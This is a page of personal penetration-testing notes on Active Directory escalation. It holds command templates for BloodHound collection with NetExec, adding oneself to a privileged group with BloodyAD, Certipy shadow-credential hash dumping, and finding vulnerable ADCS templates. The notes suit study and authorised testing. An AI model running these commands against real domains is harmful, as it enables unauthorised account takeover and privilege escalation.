---
description: >-
  Work on notes for certipy, certutil and BloodyAD - there may be a better way
  than listing out these tools like this - maybe a page about Kerberoasting and
  escalation? idk yet
icon: stairs
---

# Escalation

{% embed url="https://www.prosec-networks.com/en/blog/adcs-privescaas/" %}

### NXC

#### Gathering Data for Bloodhound to find escalation paths

{% code overflow="wrap" %}
```sh
nxc ldap [ds-host] -u [username] -p '[password]' --bloodhound --dns-server [dns ip] --collection all
```
{% endcode %}

### BloodyAD

If we're a member of a group that has GenericAll or GenericWrite privileges over another group, we can assign ourselves to that group if it improves our reach

{% code overflow="wrap" %}
```sh
bloodyAD --host [dc-host] -d [domain] -u [username] -p '[password]' add groupMember "[Group Name]" [username]

```
{% endcode %}

### Certipy

We can dump hashes of a user that we have GenericWrite over

* **BE SURE TO ADJUST YOUR CLOCK BEFORE THESE**

{% code overflow="wrap" %}
```sh
ntpdate [domain]
certipy-ad shadow auto -username [username]@[domain] -password '[password]' -account [target account]
```
{% endcode %}

### Getting Common Name of CA

#### NXC

{% code overflow="wrap" %}
```sh
nxc ldap [dc-host] -u [username] -H [user hash] -M adcs 
```
{% endcode %}

#### Certutil

You can use Certutil to get this information if you're logged in as a user (Evil-winrm)

```sh
certutil -dump
```

#### Bloodhound

You can also see this in bloodhound

### Find Vulnerable Templates

{% code overflow="wrap" %}
```sh
certipy-ad find -dc-ip [dc-ip] -u [username] -hashes [user hash] -ns [dns ip] -vulnerable
```
{% endcode %}
